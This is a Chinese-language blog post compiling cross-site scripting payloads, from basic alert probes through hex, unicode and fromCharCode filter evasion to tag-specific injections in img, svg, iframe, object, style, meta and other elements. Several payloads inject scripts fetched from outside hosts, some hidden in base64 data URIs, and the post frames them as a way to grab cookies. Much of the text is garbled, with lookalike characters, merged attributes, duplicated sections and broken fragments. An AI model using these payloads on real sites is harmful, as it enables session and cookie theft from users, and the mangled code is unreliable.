xss其他标签下的js用法总结大全

binggoogle 2016-07-25 13:24:31  5421  收藏 1
分类专栏： 前端
xss其他标签下的js用法总结大全

https://www.91ri.org/16155.html

前段时间我遇到一个问题，就是说普通的平台获取cookie的语句为

<script src=js地址></script>

实际上我们的测试语句可能为↓

<script>alert("90sec")</script>

也就是说js语句实际上是位于↓
<script></script>的中间。

包括<img>、<input>、<object>、<iframe>、<a></a>、<svg>、标签等情况下的xss构造。

所以我们就需要了解各种标签下的js用法，不然很多时候不可以使用<script>就很麻烦了。

【XSS基本探测pyload】

<script>alert(“xss”)</script>

<script>alert(/xss/)</script>//双引号换成斜杠

<script>alert(‘xss’)</script>//用单引号

<script>alert("xss");</script>//用分号

<script>alert('xss');</script>

<script>alert(/xss/);</script>

<script>alert("jdq") //自动补全

 

<script>alert("xss");;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</script>//用分号

<script>alert("xss");;;;;;;;;;;;;;;;;    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</script>//空格+分号

 

<script>alert("xss");;;;;;;;;;;;;;;;;       ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</script>//换行符

 

<script>alert("xss");;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;</script>//回车

单引号被过滤

<script>alert(/jdq/)</script>  //用双引号会把引号内的内容单独作为内容 用斜杠，则会连斜杠一起回显

【javascript伪协议】回旋

<ahref="javascript:alert(/test/)">xss</a>

【javascript伪协议】回旋

<ahref="javascript:alert(/test/)">xss</a>

alert被过滤

<img src="1" οnerrοr=eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29")></img>

【img标记】

<img src=xοnerrοr=s=createElement('script');body.appendChild(s);s.src='http://t.cn/R5UpyOt';>

on事件点击触发

οnclick="alert('xss') //注意要用单引号 双引号不会触发

on事件点击触发

οnclick="alert('xss') //注意要用单引号 双引号不会触发

【利用函数加密】

eval 函数配合编码

<script>eval(“js+16进制加密”)</script>

 

<script>eval("\x61\x6c\x65\x72\x74\x28\x22\x78\x73\x73\x22\x29")</script>

编码要执行的语句↓

Alert(“xss”)

【unicode加密】

<script>eval("unicode加密")</script>

//js unicode加密 解决alert()被过滤

<script>eval("\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029")</script>

格式↓

标记eval(“编码”) 结束标记

【String.fromCharCod函数】

String.fromCharCode需要配合eval来实现，

构造

<script>eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,13))</script>

eval内容加引号相当于正常js语句来执行

不加引号，则是默认作为eval的其他参数语句来执

固定格式→<script>eval(String.fromCharCode编码内容))</script>

【String.fromCharCod函数】

String.fromCharCode需要配合eval来实现，

构造

<script>eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,13))</script>

eval内容加引号相当于正常js语句来执行

不加引号，则是默认作为eval的其他参数语句来执

固定格式→<script>eval(String.fromCharCode编码内容))</script>

【各标签实战pyload】
——————————————————-xss其他标签下的js用法总结大全––——————————–————————————

 

<imgsrc=javascript:document.write('<scr'+'ipt src=\'http://www.baidu.com/1.txt\'></scr'+'ipt>')></img>  //仅支持IE6

 

 

<imgsrc=javascript:window.s=document.createElement('script');window.s.src='http://lcx.cc/1.js';document.body.appendChild(window.s);></img>  //仅支持IE6

 

 

<imgsrc="pdpdp.gif"></img>  //通杀所有浏览器能触发xss

 

<img src="pdpdp.gif"></img>   //通杀所有浏览器 能触发xss

 

 

<img src=xοnerrοr=document.body.appendChild(document.createElement("scr"+"ipt")).src="http://www.baidu.com">

 

 

<input autofocus="bbbb" />

 

 

<objectdata="data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3QuY24vUkd1V0REUz48L3NjcmlwdD4="></object>

 

<iframe width="0px"height="0px"src="data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3QuY24vUkd1V0REUz48L3NjcmlwdD4="></iframe>  ie不支持

 

<ahref="data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3d3dy5wb29qeC5jb20vMS5qcz48L3NjcmlwdD4=">sb</a>

 

<anchor>、<img>(不执行js)<a>(需点击) <meta>.....

 

<anchorοnlοad=document.body.appendChild(document.createElement("scr"+"ipt")).src="http://www.baidu.com">

 

<svgοnlοad=document.body.appendChild(document.CReateElement("scr"+"ipt")).src="http://www.baidu.com">

 

<svgοnlοad=document.write(String.fromCharCode(60,115,99,114,105,112,116,32,115,114,99,61,104,116,116,112,58,47,47,116,46,99,110,47,82,71,117,87,68,68,83,62,60,47,115,99,114,105,112,116,62))>

 

<baa id="1" tabindex=0>

 

 

 

 

(1)普通的XSS JavaScript注入

<SCRIPTSRC=http://3w.org/XSS/xss.js></SCRIPT>

 

(2)IMG标签XSS使用JavaScript命令

<SCRIPTSRC=http://3w.org/XSS/xss.js></SCRIPT>

 

(3)IMG标签无分号无引号

<IMG SRC=javascript:alert(‘XSS’)>

 

(4)IMG标签大小写不敏感

<IMG SRC=JaVaScRiPt:alert(‘XSS’)>

 

(5)HTML编码(必须有分号)

<IMG SRC=javascript:alert(“XSS”)>

 

(6)修正缺陷IMG标签

<IMG“”"><SCRIPT>alert(“XSS”)</SCRIPT>”>

 

(7)formCharCode标签

<IMGSRC=javascript:alert(String.fromCharCode(88,83,83))>

 

(8)UTF-8的Unicode编码

<IMG SRC=jav..省略..S')>

 

(9)7位的UTF-8的Unicode编码是没有分号的

<IMG SRC=jav..省略..S')>

 

(10)十六进制编码也是没有分号

<IMG SRC=\'#\'" /span>

 

(11)嵌入式标签,将Javascript分开

<IMG SRC=\'#\'"ascript:alert(‘XSS’);”>

 

(12)嵌入式编码标签,将Javascript分开

<IMG SRC=\'#\'" ascript:alert(‘XSS’);”>

 

(13)嵌入式换行符

<IMG SRC=\'#\'"ascript:alert(‘XSS’);”>

 

(14)嵌入式回车

<IMG SRC=\'#\'"ascript:alert(‘XSS’);”>

 

(15)嵌入式多行注入JavaScript,这是XSS极端的例子

<IMG SRC=\'#\'" /span>

 

(16)解决限制字符(要求同页面)

<script>z=’document.’</script>

<script>z=z+’write(“‘</script>

<script>z=z+’<script’</script>

<script>z=z+’ src=ht’</script>

<script>z=z+’tp://ww’</script>

<script>z=z+’w.shell’</script>

<script>z=z+’.net/1.’</script>

<script>z=z+’js></sc’</script>

<script>z=z+’ript>”)’</script>

<script>eval_r(z)</script>

 

(17)空字符

perl -e ‘print “<IMGSRC=java\0script:alert(\”XSS\”)>”;’ > out

 

(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用

perl -e ‘print“<SCR\0IPT>alert(\”XSS\”)</SCR\0IPT>”;’ > out

 

(19)Spaces和meta前的IMG标签

<IMG SRC=\'#\'"
  javascript:alert(‘XSS’);”>

 

(20)Non-alpha-non-digit XSS

<SCRIPT/XSS SRC=\'#\'"/span>[url=http://3w.org/XSS/xss.js]http://3w.org/XSS/xss.js[/url]”></SCRIPT>

 

(21)Non-alpha-non-digit XSS to 2

<BODYonload!#$%&()*~+-_.,:;?@[/|\]^`=alert(“XSS”)>

 

(22)Non-alpha-non-digit XSS to 3

<SCRIPT/SRC=\'#\'"/span>[url=http://3w.org/XSS/xss.js]http://3w.org/XSS/xss.js[/url]”></SCRIPT>

 

(23)双开括号

<<SCRIPT>alert(“XSS”);//<</SCRIPT>

 

(24)无结束脚本标记(仅火狐等浏览器)

<SCRIPTSRC=http://3w.org/XSS/xss.js?<B>

 

(25)无结束脚本标记2

<SCRIPT SRC=//3w.org/XSS/xss.js>

 

(26)半开的HTML/JavaScriptXSS

<IMG SRC=\'#\'" /span>

 

(27)双开角括号

<iframe src=http://3w.org/XSS.html <

 

(28)无单引号 双引号 分号

<SCRIPT>a=/XSS/

alert(a.source)</SCRIPT>

 

(29)换码过滤的JavaScript

\”;alert(‘XSS’);//

 

(30)结束Title标签

</TITLE><SCRIPT>alert(“XSS”);</SCRIPT>

 

(31)Input Image

<INPUT SRC=\'#\'" /span>

 

(32)BODY Image

<BODYBACKGROUND=”javascript:alert(‘XSS’)”>

 

(33)BODY标签

<BODY(‘XSS’)>

 

(34)IMG Dynsrc

<IMG DYNSRC=\'#\'" /span>

 

(35)IMG Lowsrc

<IMG LOWSRC=\'#\'" /span>

 

(36)BGSOUND

<BGSOUND SRC=\'#\'" /span>

 

(37)STYLE sheet

<LINK REL=”stylesheet”HREF=”javascript:alert(‘XSS’);”>

 

(38)远程样式表

<LINK REL=”stylesheet”HREF=”[url=http://3w.org/xss.css]http://3w.org/xss.css[/url]”>

 

(39)List-style-image(列表式)

<STYLE>li {list-style-image:url(“javascript:alert(‘XSS’)”);}</STYLE><UL><LI>XSS

 

(40)IMG VBscript

<IMG SRC=\'#\'"/STYLE><UL><LI>XSS

 

(41)META链接url

<META HTTP-EQUIV=”refresh” CONTENT=”0;URL=http://;URL=javascript:alert(‘XSS’);”>

 

(42)Iframe

<IFRAME SRC=\'#\'" /IFRAME>

 

(43)Frame

<FRAMESET><FRAME SRC=\'#\'"/FRAMESET>

 

(44)Table

<TABLEBACKGROUND=”javascript:alert(‘XSS’)”>

 

(45)TD

<TABLE><TDBACKGROUND=”javascript:alert(‘XSS’)”>

 

(46)DIV background-image

<DIV STYLE=”background-image:url(javascript:alert(‘XSS’))”>

 

(47)DIV background-image后加上额外字符(1-32&34&39&160&8192-8&13&12288&65279)

<DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”>

 

(48)DIV expression

<DIV STYLE=”width: expression_r(alert(‘XSS’));”>

 

(49)STYLE属性分拆表达

<IMGSTYLE=”xss:expression_r(alert(‘XSS’))”>

 

(50)匿名STYLE(组成:开角号和一个字母开头)

<XSSSTYLE=”xss:expression_r(alert(‘XSS’))”>

 

(51)STYLE background-image

<STYLE>.XSS{background-image:url(“javascript:alert(‘XSS’)”);}</STYLE><ACLASS=XSS></A>

 

(52)IMG STYLE方式

exppression(alert(“XSS”))’>

 

(53)STYLE background

<STYLE><STYLEtype=”text/css”>BODY{background:url(“javascript:alert(‘XSS’)”)}</STYLE>

 

(54)BASE

<BASEHREF=”javascript:alert(‘XSS’);//”>

 

(55)EMBED标签,你可以嵌入FLASH,其中包涵XSS

<EMBED SRC=\'#\'"/span>[flash]http://3w.org/XSS/xss.swf[/flash]” ></EMBED>